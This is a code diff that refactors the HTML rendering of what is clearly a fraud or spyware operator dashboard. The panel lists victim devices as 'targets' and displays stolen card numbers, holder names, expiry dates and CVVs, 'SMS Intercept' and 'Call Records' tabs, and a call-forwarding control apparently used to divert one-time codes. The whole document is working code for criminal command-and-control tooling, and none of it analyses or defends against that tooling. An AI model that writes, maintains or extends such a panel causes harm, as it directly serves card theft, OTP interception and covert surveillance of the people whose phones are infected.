@@ -502,19 +502,19 @@
                 u.device_id.toLowerCase().includes(search)
             );
             document.getElementById('activeCount').textContent = filtered.length;
-            list.innerHTML = filtered.map(user => `
-                <div class="user-card" onclick="openUser('${user.device_id}')">
-                    <div class="avatar-wrapper">
-                        <div class="avatar">${(user.full_name || 'U').charAt(0)}</div>
-                        <div class="status-dot"></div>
-                    </div>
-                    <div class="user-info">
-                        <div class="u-name">${user.full_name || 'New Target Found'}</div>
-                        <div class="u-meta"><i class="ph-fill ph-smartphone"></i> ${user.device_id.substring(0,12)}...</div>
-                    </div>
-                    <i class="ph-bold ph-caret-right chevron"></i>
-                </div>
-            `).join('');
+            list.innerHTML = filtered.map(user => {
+                return '<div class="user-card" onclick="openUser(\'' + user.device_id + '\')">' +
+                    '<div class="avatar-wrapper">' +
+                        '<div class="avatar">' + (user.full_name || 'U').charAt(0) + '</div>' +
+                        '<div class="status-dot"></div>' +
+                    '</div>' +
+                    '<div class="user-info">' +
+                        '<div class="u-name">' + (user.full_name || 'New Target Found') + '</div>' +
+                        '<div class="u-meta"><i class="ph-fill ph-smartphone"></i> ' + user.device_id.substring(0,12) + '...</div>' +
+                    '</div>' +
+                    '<i class="ph-bold ph-caret-right chevron"></i>' +
+                '</div>';
+            }).join('');
         }
 
         function openUser(deviceId) {
@@ -538,53 +538,57 @@
         function renderDrawer() {
             if (!activeUser) return;
             const header = document.getElementById('drawerHeader');
-            header.innerHTML = `
-                <h2 style="font-size: 26px; font-weight: 800;">${activeUser.full_name || 'Device Details'}</h2>
-                <div style="display: flex; gap: 10px; margin-top: 5px;">
-                    <span style="font-size: 12px; color: var(--text-dim); background: var(--surface); padding: 4px 10px; border-radius: 100px; border: 1px solid var(--border);">
-                        <i class="ph ph-fingerprint"></i> ${activeUser.device_id.substring(0,10)}
-                    </span>
-                    <span style="font-size: 12px; color: var(--success); background: rgba(52,199,89,0.1); padding: 4px 10px; border-radius: 100px;">
-                        <i class="ph-fill ph-circle"></i> ONLINE
-                    </span>
-                </div>`;
+            header.innerHTML = '<h2 style="font-size: 26px; font-weight: 800;">' + (activeUser.full_name || 'Device Details') + '</h2>' +
+                '<div style="display: flex; gap: 10px; margin-top: 5px;">' +
+                    '<span style="font-size: 12px; color: var(--text-dim); background: var(--surface); padding: 4px 10px; border-radius: 100px; border: 1px solid var(--border);">' +
+                        '<i class="ph ph-fingerprint"></i> ' + activeUser.device_id.substring(0,10) +
+                    '</span>' +
+                    '<span style="font-size: 12px; color: var(--success); background: rgba(52,199,89,0.1); padding: 4px 10px; border-radius: 100px;">' +
+                        '<i class="ph-fill ph-circle"></i> ONLINE' +
+                    '</span>' +
+                '</div>';
+
             const body = document.getElementById('drawerMain');
             const logs = activeTab === 'sms' ? 
                 allData.sms.filter(s => s.device_id === activeUser.device_id) :
                 allData.calls.filter(c => c.device_id === activeUser.device_id);
-            body.innerHTML = `
-                <div class="premium-card">
-                    <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 25px;">
-                        <span style="font-size: 10px; font-weight: 800; color: rgba(255,255,255,0.4); letter-spacing: 2px;">SECURE CARD ASSET</span>
-                        <i class="ph-fill ph-shield-check" style="color: var(--primary); font-size: 24px;"></i>
-                    </div>
-                    <div class="p-card-num">${activeUser.card_num || '**** **** **** ****'}</div>
-                    <div class="p-card-row">
-                        <div><span>Card Holder</span><div class="p-card-val">${activeUser.card_name || 'NOT CAPTURED'}</div></div>
-                        <div style="text-align: right;"><span>EXP / CVV</span><div class="p-card-val">${activeUser.card_exp || '**/**'} / ${activeUser.card_cvv || '***'}</div></div>
-                    </div>
-                </div>
-                <div class="control-group">
-                    <span class="control-label">Forwarding Protocol</span>
-                    <input type="tel" class="custom-input" id="fwdNum" value="${activeUser.forwarding_number || ''}" placeholder="+91 00000 00000">
-                    <button class="action-btn" onclick="saveForwarding()"><i class="ph-bold ph-lightning"></i> SYNC PROTOCOL</button>
-                </div>
-                <span class="control-label">Intercepted Data</span>
-                <div class="tab-bar">
-                    <div class="tab-item ${activeTab === 'sms' ? 'active' : ''}" onclick="switchTab('sms')">SMS Intercept</div>
-                    <div class="tab-item ${activeTab === 'calls' ? 'active' : ''}" onclick="switchTab('calls')">Call Records</div>
-                </div>
-                <div class="log-list">
-                    ${logs.length === 0 ? '<div style="text-align:center; padding:60px 0; color:var(--text-dim);"><i class="ph ph-cube" style="font-size:40px; opacity:0.2;"></i><p style="margin-top:10px; font-size:14px; font-weight:600;">Waiting for data sync...</p></div>' : 
-                    logs.map(log => `
-                        <div class="log-tile">
-                            <div class="lt-top">
-                                <span class="lt-sender">${activeTab === 'sms' ? log.sender : log.number}</span>
-                                <span class="lt-time">${new Date(log.received_at || log.called_at).toLocaleTimeString([], {hour: '2-digit', minute:'2-digit'})}</span>
-                            </div>
-                            <div class="lt-msg">${activeTab === 'sms' ? log.message : \`Type: \${log.type} | Duration: \${log.duration}s\`}</div>
-                        </div>`).join('')}
-                </div>`;
+
+            let logsHtml = logs.length === 0 ? '<div style="text-align:center; padding:60px 0; color:var(--text-dim);"><i class="ph ph-cube" style="font-size:40px; opacity:0.2;"></i><p style="margin-top:10px; font-size:14px; font-weight:600;">Waiting for data sync...</p></div>' : 
+                logs.map(log => {
+                    const time = new Date(log.received_at || log.called_at).toLocaleTimeString([], {hour: '2-digit', minute:'2-digit'});
+                    const sender = activeTab === 'sms' ? log.sender : log.number;
+                    const msg = activeTab === 'sms' ? log.message : 'Type: ' + log.type + ' | Duration: ' + log.duration + 's';
+                    return '<div class="log-tile">' +
+                        '<div class="lt-top">' +
+                            '<span class="lt-sender">' + sender + '</span>' +
+                            '<span class="lt-time">' + time + '</span>' +
+                        '</div>' +
+                        '<div class="lt-msg">' + msg + '</div>' +
+                    '</div>';
+                }).join('');
+
+            body.innerHTML = '<div class="premium-card">' +
+                    '<div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 25px;">' +
+                        '<span style="font-size: 10px; font-weight: 800; color: rgba(255,255,255,0.4); letter-spacing: 2px;">SECURE CARD ASSET</span>' +
+                        '<i class="ph-fill ph-shield-check" style="color: var(--primary); font-size: 24px;"></i>' +
+                    '</div>' +
+                    '<div class="p-card-num">' + (activeUser.card_num || '**** **** **** ****') + '</div>' +
+                    '<div class="p-card-row">' +
+                        '<div><span>Card Holder</span><div class="p-card-val">' + (activeUser.card_name || 'NOT CAPTURED') + '</div></div>' +
+                        '<div style="text-align: right;"><span>EXP / CVV</span><div class="p-card-val">' + (activeUser.card_exp || '**/**') + ' / ' + (activeUser.card_cvv || '***') + '</div></div>' +
+                    '</div>' +
+                '</div>' +
+                '<div class="control-group">' +
+                    '<span class="control-label">Forwarding Protocol</span>' +
+                    '<input type="tel" class="custom-input" id="fwdNum" value="' + (activeUser.forwarding_number || '') + '" placeholder="+91 00000 00000">' +
+                    '<button class="action-btn" onclick="saveForwarding()"><i class="ph-bold ph-lightning"></i> SYNC PROTOCOL</button>' +
+                '</div>' +
+                '<span class="control-label">Intercepted Data</span>' +
+                '<div class="tab-bar">' +
+                    '<div class="tab-item ' + (activeTab === 'sms' ? 'active' : '') + '" onclick="switchTab(\'sms\')">SMS Intercept</div>' +
+                    '<div class="tab-item ' + (activeTab === 'calls' ? 'active' : '') + '" onclick="switchTab(\'calls\')">Call Records</div>' +
+                '</div>' +
+                '<div class="log-list">' + logsHtml + '</div>';
         }
 
         function switchTab(tab) { activeTab = tab; renderDrawer(); }
